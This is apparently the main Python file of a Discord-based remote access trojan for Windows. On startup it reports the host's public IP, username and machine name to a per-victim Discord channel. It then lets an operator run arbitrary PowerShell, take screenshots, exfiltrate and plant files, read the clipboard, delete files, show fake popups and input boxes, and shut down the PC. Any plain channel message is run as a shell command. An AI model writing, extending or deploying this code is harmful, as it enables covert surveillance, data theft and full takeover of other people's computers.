import asyncio
import getpass
import socket
from typing import cast

import discord
import requests
from discord import TextChannel
from discord.ext import commands
from discord.ext.commands import Context

from src.cmd.clipboard import get_clipboard
from src.cmd.delete_file import delete_file
from src.cmd.download_file import download_file
from src.cmd.input_box import inputbox_show
from src.cmd.move_file import move_file
from src.cmd.msgbox import msgbox_show
from src.cmd.openurl import spawn_proc
from src.cmd.popup import popup_show
from src.cmd.screenshot import take_screenshot
from src.cmd.shell import execute_cmd
from src.cmd.upload_file import upload_file
from src.cmd.voice import voice_api
from src.cmd.wallpaper import set_wallpaper
from src.constants import UPDATE_TAG, VERSION

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

channel = None
pc_user_name = "Unknown"

bot = commands.Bot(command_prefix="z!", intents=intents, owner_id=915623041105551420)


@bot.event
async def on_ready():
    if not bot.user:
        raise ValueError("Bot user not found.")

    print(f"#- Logged in as {bot.user}!")
    # await bot.tree.sync()
    # print("i- Slash commands synced.")
    print("#- Connected Guilds:")
    for i, guild in enumerate(bot.guilds):
        print(f"[{i + 1}] {guild.name} (ID: {guild.id})")

    global channel
    global pc_user_name

    guild = bot.guilds[0]
    response = await asyncio.to_thread(requests.get, "https://api.ipify.org")
    ip = response.text.replace(".", "-").strip()
    username = getpass.getuser()
    pc_name = socket.gethostname()

    pc_user_name = f"{pc_name.strip()}/{username.strip()}"
    channel_name = f"{pc_user_name.replace('/', '_').lower()}_{ip}"

    channel = next(
        (
            cast(TextChannel, existing_channel)
            for existing_channel in guild.channels
            if existing_channel.name == channel_name
        ),
        None,
    )

    if channel is None:
        channel = await guild.create_text_channel(channel_name)

    connection_msg_string = f"""
======= User **CONNECTED** =======
*Username:* {pc_user_name}
*IP:* {ip.replace("-", ".")}
    """.strip()
    await channel.send(connection_msg_string)


exit_confirmation = False


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if not channel or message.channel.id != channel.id:
        return

    if (
        message.content.strip().lower() == "yes"
        or message.content.strip().lower() == "no"
    ):
        return

    if not message.content.startswith(bot.command_prefix):
        global exit_confirmation

        if message.content.startswith("exit") and not exit_confirmation:
            exit_confirmation = True
            message.send("*Are you sure you want to exit the process?*")
            return

        exit_confirmation = False
        message.content = f"z!shell {message.content}"

    await bot.process_commands(message)


# ====================
# === PING COMMAND ===
# ====================
@bot.command(name="ping", description="Check the bot's latency.")
async def ping(ctx: Context, *, args: str | None):
    latency = round(bot.latency * 1000)  # latency in milliseconds

    if args and "-v" in args:
        await ctx.reply(
            f"Pong! 🏓 ({latency / 10}ms)\n**User:** {pc_user_name}\n**Version:** {VERSION}\n**Update Tag:** {UPDATE_TAG}"
        )
    else:
        await ctx.reply(f"Pong! 🏓 ({latency / 10}ms)")


# =========================
# === SHELL COMMAND ===
# =========================
@bot.command(name="shell", description="Run powershell commands")
@commands.is_owner()
@commands.guild_only()
async def shell(ctx: Context, *, user_cmd: str | None):
    if not user_cmd:
        await ctx.reply(
            "⚠️ Please enter a command to execute\nUsage: z!shell `<command>`"
        )
        return

    result = execute_cmd(user_cmd) or f'Executed "{user_cmd}" with no output'
    await ctx.reply(result)


# ===========================
# === SCREENSHOT COMMAND ===
# ===========================
@bot.command(
    name="screenshot",
    description="Capture the bot host's screen",
)
@commands.is_owner()
@commands.guild_only()
async def screenshot(ctx):
    await take_screenshot(ctx)


# ===========================
# === VOICE COMMAND ===
# ===========================
@bot.command(name="voice", description="Speak text aloud using Windows text-to-speech.")
@commands.is_owner()
@commands.guild_only()
async def voice(ctx, *, text: str):
    await voice_api(ctx, text)


# ===========================
# === OPENURL COMMAND ===
# ===========================
@bot.command(
    name="openurl", description="Open a URL in the Windows computer's default browser."
)
@commands.is_owner()
@commands.guild_only()
async def open_url(ctx, *, url: str):
    await spawn_proc(ctx, url)


# ===========================
# === UPLOAD COMMAND ===
# ===========================
@bot.command(
    name="upload",
    description="Download a file from an attachment or URL and upload it to Discord.",
)
@commands.is_owner()
@commands.guild_only()
async def upload(ctx, url: str | None = None):
    await upload_file(ctx, url)


# ===========================
# === DOWNLOAD COMMAND ===
# ===========================
@bot.command(
    name="download", description="Resolve a file path and send the file to Discord."
)
@commands.is_owner()
@commands.guild_only()
async def download(ctx, *, path: str):
    await download_file(ctx, path)


# ===========================
# === DELETE COMMAND ===
# ===========================
@bot.command(name="delete", description="Delete a file or a folder")
@commands.is_owner()
@commands.guild_only()
async def delete(ctx, *, path: str):
    await delete_file(bot, ctx, path)


# ===========================
# === MOVE FILE COMMAND ===
# ===========================
@bot.command(name="move", description="moves files and folders from <src> to <dest>")
@commands.is_owner()
@commands.guild_only()
async def move(ctx, *, paths: str):
    await move_file(ctx, paths)


# ===========================
# === POPUP COMMAND ===
# ===========================
@bot.command(name="popup", description="Display a native windows popup msgbox")
@commands.is_owner()
@commands.guild_only()
async def popup(ctx, *, msg: str):
    await popup_show(ctx, msg)


# ===========================
# === MSGBOX COMMAND ===
# ===========================
@bot.command(
    name="msgbox",
    description="Display a native windows popup msgbox with custom buttons",
)
@commands.is_owner()
@commands.guild_only()
async def msgbox(ctx, *, args: str):
    await msgbox_show(ctx, args)


# ===========================
# === INPUTBOX COMMAND ===
# ===========================
@bot.command(name="inputbox", description="Display a native windows input form")
@commands.is_owner()
@commands.guild_only()
async def inputbox(ctx, *, prompt: str):
    await inputbox_show(ctx, prompt)


# ===========================
# === SHUTDOWN COMMAND ===
# ===========================
@bot.command(name="shutdown", description="shutdown PC immediately")
@commands.is_owner()
@commands.guild_only()
async def shutdown(ctx, timeout: str | None = "0"):
    timeout_seconds = 0
    try:
        timeout_seconds = int(timeout)
    except Exception:
        timeout_seconds = 0

    shutdown_cmd = r"shutdown /s /t " + timeout_seconds
    result = execute_cmd(shutdown_cmd) or f"PC about to shutdown in {timeout_seconds}s"
    await ctx.reply(result)


# ===========================
# === RESTART COMMAND ===
# ===========================
@bot.command(name="restart", description="restart PC immediately")
@commands.is_owner()
@commands.guild_only()
async def restart(ctx, timeout: str | None = "0"):
    timeout_seconds = 0
    try:
        timeout_seconds = int(timeout)
    except Exception:
        timeout_seconds = 0

    shutdown_cmd = r"shutdown /r /t " + timeout_seconds
    result = execute_cmd(shutdown_cmd) or f"PC about to restart in {timeout_seconds}s"
    await ctx.reply(result)


# ===========================
# === WALLPAPER COMMAND ===
# ===========================
@bot.command(name="wallpaper", description="Sets the wallpaper of the image provided")
@commands.is_owner()
@commands.guild_only()
async def wallpaper(ctx):
    await set_wallpaper(ctx)


# ===========================
# === CLIPBOARD COMMAND ===
# ===========================
@bot.command(name="clipboard", description="Gets content from users clipboard")
@commands.is_owner()
@commands.guild_only()
async def clipboard(ctx, action: str = "read", *, text: str = None):
    await get_clipboard(ctx, action, text)
